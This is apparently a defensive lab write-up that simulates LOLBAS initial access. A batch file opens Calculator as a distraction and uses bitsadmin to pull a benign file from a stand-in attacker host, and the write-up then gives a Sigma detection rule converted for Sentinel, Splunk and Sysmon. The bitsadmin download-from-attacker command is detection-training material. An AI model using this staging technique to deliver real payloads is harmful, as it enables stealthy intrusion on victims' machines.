⚙️ Lab Setup

Victim Machine: Windows 10 Pro (VM)

Attacker Host: Windows 10 Pro (Host)

Tools:

bitsadmin.exe (Windows built-in binary)

calc.exe (benign process for visibility)

hello.txt (benign payload)

Batch file: simulate_initial_access.bat

Sigma CLI

🔹 Step 1: Create a Benign Payload

On the attacker host machine:

echo "Hello, LOLBAS Test" > C:\inetpub\wwwroot\hello.txt

🔹 Step 2: Host the File

Ensure the file is reachable:

Start-Service W3SVC


Check in browser:

http://<attacker-ip>/hello.txt

🔹 Step 3: Create Malicious Batch File

On the victim VM, create a file simulate_initial_access.bat with:

@echo off
start calc.exe
bitsadmin /transfer myDownloadJob /download /priority normal http://<attacker-ip>/hello.txt %USERPROFILE%\Downloads\hello.txt


This does two things:

Opens Calculator (benign distraction).

Downloads hello.txt (simulating a staged payload).

🔹 Step 4: Execute the File

On the VM:

simulate_initial_access.bat


✅ Calculator opens.
✅ File downloaded to C:\Users\<user>\Downloads\hello.txt.

🔹 Step 5: Verify File Download
cd %USERPROFILE%\Downloads
dir hello.txt

🔹 Step 6: Collect Logs (Detection Evidence)

Use Event Viewer / PowerShell:

Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4688 } | Format-List TimeCreated, Message


Key events observed:

cmd.exe → launched

bitsadmin.exe → executed with /transfer

powershell.exe (in related test)

🔹 Step 7: Write Sigma Rules

Three rules were created:

win_bitsadmin_download.yml

win_powershell_iwr_from_cmd.yml

win_powershell_network_download.yml

Example (win_bitsadmin_download.yml):

title: Bitsadmin File Download
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    EventID: 4688
    NewProcessName|endswith: '\bitsadmin.exe'
    CommandLine|contains:
      - '/transfer'
      - '/download'
condition: selection
level: high

🔹 Step 8: Validate Rules with Sigma CLI
pip install sigmatools


Validate YAML:

sigmac -t windows-audit win_bitsadmin_download.yml

🔹 Step 9: Convert to JSON (Sentinel Rule Example)
sigmac -t sentinel-rule win_bitsadmin_download.yml > win_bitsadmin_download.json
sigmac -t sentinel-rule win_powershell_iwr_from_cmd.yml > win_powershell_iwr_from_cmd.json
sigmac -t sentinel-rule win_powershell_network_download.yml > win_powershell_network_download.json


Now you have deployable JSON alert rules for Azure Sentinel.

🔹 Step 10: (Optional) Convert to Splunk/Sysmon

For Splunk:

sigmac -t splunk win_bitsadmin_download.yml


For Sysmon:

sigmac -t sysmon win_powershell_network_download.yml

📊 Results

Attack Simulated: .bat file used LOLBAS (bitsadmin) to download payload.

Detection Evidence: Windows Security Event ID 4688 logs.

Sigma Rules: Created for bitsadmin + PowerShell activity.

Converted Outputs: JSON rules ready for Sentinel, SPL queries for Splunk.

✅ Conclusion

This lab demonstrates:

How LOLBAS binaries can be misused for stealthy payload staging.

How to detect them with Sigma rules.

How to convert Sigma into platform-specific rules for SIEM integration.